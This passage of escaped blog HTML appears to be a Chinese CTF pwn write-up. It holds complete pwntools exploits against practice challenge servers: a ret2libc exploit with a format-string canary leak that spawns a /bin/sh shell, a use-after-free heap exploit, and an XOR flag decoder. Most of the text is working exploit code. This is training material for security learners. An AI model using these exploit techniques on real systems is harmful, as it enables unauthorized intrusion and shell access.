class=&#34;line&#34;&gt;p.sendlineafter(b&amp;#x27;pe&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babyrop2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babyrop2&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babyrop2&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;这个题讲究的是 ret2libc 注意字符串溢出为 7 即可按照 ret2libc 打就行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28241)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;u!\n&amp;#x27;,&amp;#x27;%7$p&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;0x&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=int(p.recv(16),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(hex(a))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi=0x400993&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln=elf.sym[&amp;#x27;vuln&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x4005f9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;ory!\n&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base_addr=u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(hex(base_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts=LibcSearcher(&amp;#x27;puts&amp;#x27;,base_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=base_addr-puts.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_base+puts.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=libc_base+puts.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;ory!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020ydsneedgirlfriend&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020ydsneedgirlfriend&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]YDSneedGirlfriend&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;这个题又是一个堆的题要好好的利用 uaf 去得到 shell&lt;br /&gt;
 首先我们看到这个题目是有一个 free 来释放内存但是并没有给指针清零导致再次分配时在被占用，并且 show 函数可以来调用指针指到的函数将被调用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28732)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def add(size,name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.recvuntil(&amp;#x27;size is :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendline(str(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.recvuntil(&amp;#x27;ame is :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendline(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    sh.recvuntil(&amp;quot;choice :&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def delete(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;2&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.recvuntil(&amp;#x27;Index :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendline(str(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    sh.recvuntil(&amp;quot;choice :&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def show(idx):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.recvuntil(&amp;#x27;choice :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendline(&amp;#x27;3&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&amp;#x27;Index :&amp;#x27;,str(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(&amp;quot;oice :&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(0x10,&amp;#x27;aaaaa&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(0x20,&amp;#x27;bbbbb&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload =p64(0x400B9C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(0x10,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023奇怪的elf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023奇怪的elf&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023] 奇怪的 ELF&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;一个离谱的架构题目，两个文件一个是 x86_64 (arm64) 一个是 arm64 所以第二个因为环境原因无法运行，把 linux2 里面的 flag 转换为 16 进制然后在 python 进行一次异或运算即可得到 flag2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(chr(i^0x86),end=&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hdctf-2023makewish&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hdctf-2023makewish&#34;&gt;#&lt;/a&gt; [HDCTF 2023]Makewish&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;这个题目很有意思需要自己多次调试才能知道具体的解决办法综合了前面的很多知识点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 